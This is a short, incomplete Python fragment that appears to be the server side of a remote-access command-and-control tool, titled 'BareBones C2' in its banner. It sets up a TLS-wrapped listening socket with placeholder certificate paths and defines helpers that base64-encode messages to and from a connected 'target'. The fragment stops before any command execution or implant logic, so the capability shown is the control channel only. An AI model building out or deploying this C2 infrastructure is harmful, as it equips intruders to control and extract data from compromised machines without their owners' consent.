import socket
import threading
import time
import random
import string
import os
import os.path
import shutil
import base64
import subprocess
from datetime import datetime
from prettytable import PrettyTable
import ssl

def init_server_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind and listen omitted for brevity...
    
    # SSL Context
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile='path/to/cert.pem', keyfile='path/to/key.pem')  # Adjust the path to your certificate files

    secure_sock = context.wrap_socket(sock, server_side=True)
    return secure_sock

def banner():
    print('╔╗ ┌─┐┬─┐┌─┐┌┐ ┌─┐┌┐┌┌─┐┌─┐ ╔═╗2')
    print('╠╩╗├─┤├┬┘├┤ ├┴┐│ ││││├┤ └─┐ ║ by the Mayor')
    print('╚═╝┴ ┴┴└─└─┘└─┘└─┘┘└┘└─┘└─┘ ╚═╝')

def comm_in(targ_id):
    print(f'[+] Awaiting response...')
    response = targ_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

def comm_out(targ_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf8'))
    targ_id.send(message)
    
